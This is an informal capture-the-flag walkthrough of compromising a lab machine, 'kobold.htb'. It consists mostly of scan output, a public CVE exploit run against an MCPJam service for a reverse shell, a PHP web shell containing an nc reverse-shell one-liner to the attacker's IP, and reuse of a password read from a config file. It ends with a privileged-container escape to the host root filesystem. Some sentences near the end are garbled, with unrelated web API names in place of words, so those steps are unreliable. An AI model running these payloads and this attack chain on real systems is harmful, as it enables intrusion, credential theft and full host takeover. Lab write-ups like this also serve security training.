PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
3552/tcp open  http     Golang net/http server
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Length: 2081
|     Content-Type: text/html; charset=utf-8
|     Expires: 0
|     Pragma: no-cache
|     Date: Tue, 24 Mar 2026 03:11:24 GMT
|     <!doctype html>
|     <html lang="%lang%">
|     <head>
|     <meta charset="utf-8" />
|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
|     <meta http-equiv="Pragma" content="no-cache" />
|     <meta http-equiv="Expires" content="0" />
|     <link rel="icon" href="/api/app-images/favicon" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
|     <link rel="manifest" href="/app.webmanifest" />
|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
|     <meta name="theme-color" content="

add kobold.htb to hosts file.

port 3552 is running Arcane 1.13.0 

└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://kobold.htb -H 'Host:FUZZ.kobold.htb' -t 100 -fw 6 

get nothing.

└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://10.129.120.205 -H 'Host:FUZZ.kobold.htb' -t 140 -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.129.120.205
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.kobold.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 140
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 431ms]
bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 210ms]

add these 2 to hosts 
bin. is PrivateBin 2.0.2   donot find vuln.

mcp MCPJam Version: v1.4.2. with  a vuln     CVE-2026-23520 

https://github.com/cypher-21/CVE-2026-23520/blob/main/exploit.py


└─$ python3 exploit.py https://mcp.kobold.htb --lhost 10.10.16.4 --lport 8821        

[*] Target: https://mcp.kobold.htb/api/mcp/connect
[*] Sending exploit...

[+] Request sent (no response received).
[*] This is expected if the payload is executing.
[*] Check your listener.

➜  Downloads nc -nvlp 8821                             
Listening on 0.0.0.0 8821
Connection received on 10.129.120.205 43148
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
$ python3 -c "import pty;pty.spawn('/bin/bash')"

get user


ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /etc/passwd | grep bash
<ules/@mcpjam/inspector$ cat /etc/passwd | grep bash      
root:x:0:0:root:/root:/bin/bash
ben:x:1001:1001::/home/ben:/bin/bash
alice:x:1002:1002::/home/alice:/bin/bash

id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

-rwxrwx--- 1 root operator 1704 Mar 15 15:08 /privatebin-data/certs/key.pem
-rwxrwx--- 1 root operator 1168 Mar 15 15:08 /privatebin-data/certs/cert.pem
-rw-r----- 1 root operator 132 Feb 16 08:34 /privatebin-data/data/traffic_limiter.php

<?php # |e14880e2b0533d0b4677364d92af3ed8c796679b0f9cda2ac5516258b976aa64dc79cee416f505fa5790de9e232b1756612ac1a0f0d0d0ea2b1c4af0da621f4a8e44543775dfa0e10dfae682687b4943968ec0da01bfe487710e446acb3d2736dc43c4d916f214666c6a6a198043b0195c5c1c2733b8c89d8d6becff2bd3ca4e7a100b92a3b2fe0beb71a22f6bc62562e4e62d305e8a81877a58e161527a6c110bbf2d95738ab3c651324c92dcf04fe2e1c29a018740dec0063b6c39a5438780d882654a8d138b910fc762e04781bd7e946066da948c8522424990cb3777a904f1c5562f7832b6f7b090a805db5cd0b70bf3a35b3bd2d8b9258cadcea548187e|

cannot decode this. 


/privatebin-data
$ cd data
$ ls
12
27
bd
e3
purge_limiter.php
salt.php
traffic_limiter.php
$ echo '<?php phpinfo();?>' > test.php
$ ls
12
27
bd
e3
purge_limiter.php
salt.php
test.php
traffic_limiter.php

https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82

    bootstrap5 -- > ..%2Fdata%2Ftest 

ben@kobold:/privatebin-data/data$ echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.4 8000 >/tmp/f");?>' > a.php

..%2Fdata%2Ftest    -->   ../data/a

➜  Downloads nc -nvlp 8000
Listening on 0.0.0.0 8000
Connection received on 10.129.120.205 35243
sh: can't access tty; job control turned off
/var/www $ id
uid=65534(nobody) gid=82(www-data) groups=82(www-data)

~ $ ls -la
total 68
drwxr-xr-x    1 root     root          4096 Mar 15 21:23 .
drwxr-xr-x    1 root     root          4096 Mar 15 21:23 ..
-rwxr-xr-x    1 root     root             0 Feb 16 08:24 .dockerenv

from linpeas
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwxr-x---    1 root     www-data     25888 Mar  4 12:49 /srv/cfg/conf.php

[model]
; example of DB configuration for MySQL
; Temporarily disabling while we migrate to new server for loadbalancing
;class = Database
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
tbl = "privatebin_"    ; table prefix
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"

got a Credential
use arcane / ComplexP@sswordAdmin1928  for port 3552. this is a guess

Arcane is used to mange container

as ctr is avalablie , https://hacktricks.wiki/en/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.html

privatebin/nginx-fpm-alpine:2.0.2

http://kobold.htb:3552/containers
create a new CSSContainerRule, with the same Image. set volumn from / to /AudioParamMap, and enable privi mode .
after create ImageTrack, in the contrainer pageXOffset, launch a SVGFEMorphologyElement, view /app folder that is / of target host .

/var/www # cd /app
/app # ls
app              home             opt              snap
bin              lib              privatebin-data  srv
boot             lib64            proc             sys
cdrom            lost+found       root             tmp
dev              media            run              usr
etc              mnt              sbin             var
/app # cd root
/app/root # ls
arcane_linux_amd64  data                root.txt
/app/root # cat root.txt
